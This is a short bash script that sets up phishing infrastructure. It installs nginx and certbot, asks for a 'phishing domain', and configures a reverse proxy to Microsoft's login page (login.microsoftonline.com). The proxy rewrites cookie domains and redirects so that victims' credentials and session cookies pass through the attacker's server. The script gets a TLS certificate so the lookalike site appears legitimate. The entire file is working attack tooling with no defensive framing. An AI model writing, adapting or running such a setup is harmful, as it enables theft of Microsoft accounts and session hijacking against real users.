#!/bin/bash

# Auto Install Dependencies
apt update && apt install -y nginx python3-pip certbot python3-certbot-nginx

# Prompt for Domain
echo "Enter your phishing domain (e.g., login-secure.com):"
read PHISHING_DOMAIN

# Nginx Configuration
NGINX_CONFIG="/etc/nginx/sites-available/reverse_proxy"
echo "Setting up Nginx for $PHISHING_DOMAIN..."

cat <<EOF > $NGINX_CONFIG
server {
    listen 80;
    server_name .$PHISHING_DOMAIN;  # Wildcard support for subdomains

    location / {
        proxy_pass https://login.microsoftonline.com;
        proxy_set_header Host login.microsoftonline.com;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;

        proxy_cookie_domain login.microsoftonline.com .$PHISHING_DOMAIN;
        proxy_redirect https://login.microsoftonline.com https://$PHISHING_DOMAIN;
    }
}
EOF

# Enable Nginx Site
ln -s $NGINX_CONFIG /etc/nginx/sites-enabled/
nginx -t && systemctl restart nginx

# Install Python Dependencies
pip3 install -r requirements.txt

# Secure with SSL (Let’s Encrypt)
certbot --nginx -d $PHISHING_DOMAIN --non-interactive --agree-tos -m your-email@example.com

echo "Setup Complete! Visit: https://$PHISHING_DOMAIN"
